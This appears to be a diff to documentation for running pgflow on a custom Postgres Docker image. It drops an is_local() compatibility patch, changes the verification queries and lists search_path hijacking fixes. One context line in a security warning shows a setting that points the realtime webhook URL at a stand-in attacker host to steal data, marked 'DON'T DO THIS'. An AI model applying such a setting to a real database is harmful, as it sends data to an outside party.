@@ -23,12 +23,11 @@ This document describes how pgflow (Supabase's workflow orchestration extension)
 
 2. **Security Patches** (`docker/postgres/pgflow/security-patches.sql`)
    - Fixes search_path hijacking vulnerabilities (AZA-PGFLOW-001, AZA-PGFLOW-002)
-   - Adapts is_local() for non-Supabase environments (COMPAT-AZA-PG-001)
    - Applied at runtime after pgflow schema loads
 
-3. **Custom Installation Marker** (`00-aza-pg-settings.sh`)
-   - Sets `app.aza_pg_custom = 'true'` system-wide
-   - Used by is_local() to detect custom installations
+`pgflow.is_local()` is upstream's: it returns true only when `app.settings.jwt_secret` equals the Supabase CLI's
+built-in local secret, so on aza-pg it is false. That is the production-safe mode: when a worker deploys a flow whose
+definition changed, the worker refuses to start instead of deleting the flow and all its runs.
 
 ## Installation
 
@@ -60,7 +59,7 @@ CREATE DATABASE my_app TEMPLATE template1;
 Test that it works:
 
 ```sql
-SELECT pgflow.is_local();  -- Should return: t (true)
+SELECT obj_description('pgflow'::regnamespace);  -- pgflow <version>
 ```
 
 ## Usage
@@ -71,7 +70,7 @@ In the default database (created via `POSTGRES_DB` environment variable), pgflow
 
 ```sql
 -- Verify pgflow is installed
-SELECT pgflow.is_local();  -- Returns: t (true)
+SELECT obj_description('pgflow'::regnamespace);  -- pgflow <version>
 
 -- List available pgflow tables
 \dt pgflow.*
@@ -103,7 +102,7 @@ CREATE EXTENSION IF NOT EXISTS supabase_vault;  -- Optional: Credential storage 
 \i /opt/pgflow/security-patches.sql
 
 -- 5. Verify installation
-SELECT pgflow.is_local();  -- Returns: t (true)
+SELECT obj_description('pgflow'::regnamespace);  -- pgflow <version>
 
 -- 6. pgflow is now ready - use the DSL or SQL API
 ```
@@ -267,11 +266,10 @@ SET realtime.webhook_url = 'https://attacker.com/steal-data';  -- DON'T DO THIS
 
 ### Security Patches Applied
 
-| Identifier            | Component                | Issue                   | Fix                                   |
-| --------------------- | ------------------------ | ----------------------- | ------------------------------------- |
-| **AZA-PGFLOW-001**    | get_run_with_states()    | search_path hijacking   | Added `SET search_path = ''`          |
-| **AZA-PGFLOW-002**    | start_flow_with_states() | search_path hijacking   | Added `SET search_path = ''`          |
-| **COMPAT-AZA-PG-001** | is_local()               | Supabase-only detection | Check for `app.aza_pg_custom` setting |
+| Identifier         | Component                | Issue                 | Fix                          |
+| ------------------ | ------------------------ | --------------------- | ---------------------------- |
+| **AZA-PGFLOW-001** | get_run_with_states()    | search_path hijacking | Added `SET search_path = ''` |
+| **AZA-PGFLOW-002** | start_flow_with_states() | search_path hijacking | Added `SET search_path = ''` |
 
 ## Upstream Tracking
 
@@ -291,8 +289,8 @@ WHERE n.nspname = 'realtime' AND proname = 'send';
 -- Check pgflow schema
 SELECT COUNT(*) FROM pgflow.flows;
 
--- Test is_local() detection
-SELECT pgflow.is_local();  -- Should return: t
+-- Installed pgflow version
+SELECT obj_description('pgflow'::regnamespace);  -- pgflow <version>
 ```
 
 ### Test Event Broadcasting
@@ -351,28 +349,6 @@ docker exec <container-name> bash /docker-entrypoint-initdb.d/04a-pgflow-realtim
 ```
 
 Note: This script modifies template1 and requires PostgreSQL superuser privileges. It's normally executed automatically during container initialization.
-
-### Issue: is_local() returns false
-
-**Symptoms**:
-
-```sql
-SELECT pgflow.is_local();
--- Returns: f (false)
-```
-
-**Solution**: Verify custom installation marker:
-
-```sql
-SELECT current_setting('app.aza_pg_custom');
--- Should return: true
-```
-
-If not set, the aza-pg custom settings were not applied during initialization. This script runs automatically during container startup and requires superuser privileges. To reinstall:
-
-```bash
-docker exec <container-name> bash /docker-entrypoint-initdb.d/00-aza-pg-settings.sh
-```
 
 Note: This script sets custom PostgreSQL parameters and requires superuser privileges. It's normally executed automatically during container initialization.
 
